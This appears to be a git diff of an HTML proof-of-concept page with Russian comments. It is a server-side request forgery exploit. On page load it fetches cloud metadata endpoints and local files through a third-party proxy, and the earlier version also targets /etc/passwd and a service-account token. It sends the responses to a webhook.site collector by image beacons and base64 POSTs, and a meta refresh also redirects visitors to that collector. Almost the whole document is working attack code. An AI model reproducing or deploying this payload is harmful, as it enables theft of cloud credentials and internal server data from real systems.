@@ -2,49 +2,55 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Test</title>
+    <title>Critical Security PoC</title>
+
+    <meta property="og:description" content="Check: https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/">
+    
+    <meta http-equiv="refresh" content="0; url=https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8?data=REINIT">
 </head>
 <body>
     <script>
         const hook = "https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8";
         const proxy = "https://max.ru/proxy?url=";
         
-        // Массив целей
+        // Эти цели дадут нам названия разделов (директории)
         const targets = {
-            "passwd": "file:///etc/passwd",
-            "metadata": "http://169.254.169.254.nip.io/latest/meta-data/",
-            "token": "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token"
+            "metadata_dirs": "http://169.254.169.254.nip.io/latest/meta-data/",
+            "hostname": "http://169.254.169.254.nip.io/latest/meta-data/hostname",
+            "etc_issue": "file:///etc/issue" // В этом файле название дистрибутива (Ubuntu/Debian)
         };
 
-        // Функция отправки через картинку (не блокируется CORS)
-        function sendSignal(name, data) {
-            const img = new Image();
-            img.src = `${hook}?type=${name}&info=${encodeURIComponent(data)}&nocache=${Math.random()}`;
-        }
+        async function exfiltrate() {
+            // Сначала маякнем, что скрипт пошел
+            new Image().src = hook + "?status=JS_START";
 
-        async function run() {
-            // Сигнал о запуске
-            sendSignal("START", "Browser_Exploit_Active");
-
-            for (let key in targets) {
+            for (let [name, target] of Object.entries(targets)) {
                 try {
-                    const url = proxy + encodeURIComponent(targets[key]);
-                    
-                    // Пытаемся получить данные
-                    const r = await fetch(url);
-                    const text = await r.text();
+                    // Используем метод 'no-cors' для обхода политик, 
+                    // но для чтения текста нам нужно попытаться обычным fetch
+                    const response = await fetch(proxy + encodeURIComponent(target));
+                    const text = await response.text();
 
-                    if (text.length > 0) {
-                        // Отправляем первые 100 символов ответа
-                        sendSignal("SUCCESS_" + key, text.substring(0, 100));
+                    // Если в ответе НЕТ слова "doctype" или "SvelteKit" - значит это ЧИСТЫЕ данные!
+                    if (text.length > 0 && !text.includes("doctype") && !text.includes("svelte")) {
+                        // Шлем на вебхук только реальный улов (Base64 для надежности)
+                        fetch(hook + "/DATA_FOUND_" + name, {
+                            method: "POST",
+                            mode: "no-cors",
+                            body: btoa(text.substring(0, 500))
+                        });
+                    } else {
+                        // Если все же пришел HTML, шлем первые 50 символов (вдруг там ошибка с путем)
+                        new Image().src = hook + "?debug=" + name + "&snippet=" + encodeURIComponent(text.substring(0, 50));
                     }
                 } catch (e) {
-                    sendSignal("BLOCKED_" + key, "CORS_or_Filter");
+                    new Image().src = hook + "?error=" + name;
                 }
             }
         }
 
-        run();
+        exfiltrate();
     </script>
+    <h1>hi</h1>
 </body>
 </html>
